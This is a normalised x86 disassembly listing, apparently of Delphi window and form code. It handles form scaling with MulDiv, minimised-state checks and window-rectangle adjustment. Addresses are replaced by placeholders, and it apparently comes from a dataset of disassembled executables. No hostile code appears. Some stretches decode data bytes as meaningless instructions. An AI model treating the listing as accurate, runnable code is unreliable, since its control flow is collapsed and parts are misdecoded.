mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_466ff8
mov eax ebx
call sub_44f258
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44f29c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44f29c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_466ff8
mov eax ebx
call sub_44f29c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_4678d4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_466ff8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_466ff8
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_467148
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_467148
sub_467978
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4678d4
mov ecx edi
mov edx esi
mov eax ebx
call sub_455b60
pop edi
pop esi
pop ebx
retn
sub_4679a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_467a0a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454640
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467a11
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_467a11
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_467a49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4675f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467a50
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_467a50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_467670
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_467ac4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f29c
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42a11c
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44f258
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42a11c
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_417380
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4520c0
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_467b34
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467b95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40343c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4553d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467b9c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_467bc4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467d28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_467d08
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031f8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467d0f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_467cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4185e4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403200
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
sub_467d50
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4034ac
and [ ebx + 0x2f4 ] 0xdf
sub_467d88
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_467394
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_44efc4
xor edx edx
mov eax ebx
call sub_44efe8
mov edx 0x140
mov eax ebx
call sub_44f010
mov edx 0xf0
mov eax ebx
call sub_44f034
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296b0
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4686a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44e430
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031f8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_468a08
xor edx edx
mov eax ebx
call sub_44fa18
xor edx edx
mov eax ebx
call sub_44f980
mov dl 0x1
mov eax ebx
call sub_456194
mov edx ebx
mov eax [ rw-data ]
call sub_46d06c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_467f01
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_421610
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418b4c
xor edx edx
mov eax ebx
call sub_41be50
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_46bf14
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_467f6c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403664
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_468036
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46a890
mov eax [ ebp - 0x4 ]
call sub_456358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d0a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4032b0
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d564
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_46740c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46803d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_468050
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_468091
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_468a08
sub_468096
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4034ac
test al al
jne r-xdata
call sub_403ae0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a8c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_468a08
sub_4680cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46810d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46812c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_451928
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_46a3d4
sub_468168
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44ed24
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418854
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4697cc
mov edx esi
mov eax ebp
call sub_418b4c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4697a4
mov edx esi
mov eax edi
call sub_4697cc
jmp r-xdata
xor edx edx
mov eax edi
call sub_469780
sub_468274
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4528ec
xor edx edx
push ebp
push sub_4684ca
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452048
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f270
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f2b4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4685fc
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_450a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4684d1
mov eax [ ebp - 0x4 ]
call sub_4528f4
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4678d4
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_455b18
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4678d4
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455b18
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_4245d4
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4245dc
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4684d9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453394
push 0x0
push 0x0
push ebx
push sub_4685e0
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4685ac
push ebx
push sub_4685c4
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_46858b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c548
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44f980
sub_468617
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4678d4
mov ecx edi
mov edx esi
mov eax ebx
call sub_455b18
mov eax ebx
call sub_468700
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_424678
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424694
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44f29c
mov ebp eax
push edi
push esi
mov eax ebx
call sub_44f258
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4689a8
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_4689d8
sub_4686a4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_46aa04
push eax
push 0x1
push 0x80
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ebx
retn
sub_468738
push ebx
mov ebx eax
mov eax ebx
call sub_469654
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4687cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456054
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45611c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_468854
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4565f8
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_421994
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421968
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4034ac
test al al
jne r-xdata
sub_4688c0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031f8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4688ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebp
call sub_452d84
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_421994
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_456640
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_421968
mov si 0xfff1
call sub_4034ac
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4219a4
jmp r-xdata
sub_468980
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44fa3c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_450a20
sub_4689a8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44f270
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4689d8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44f2b4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_468a08
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_44f774
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_469b40
pop esi
pop ebx
retn
sub_468a4c
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_468aa5
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468aac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
sub_468ab4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_44f728
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_4535ac
mov eax ebx
call sub_453748
sub_468aec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4217e0
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_468b2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453a68
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034ac
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4034ac
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb024
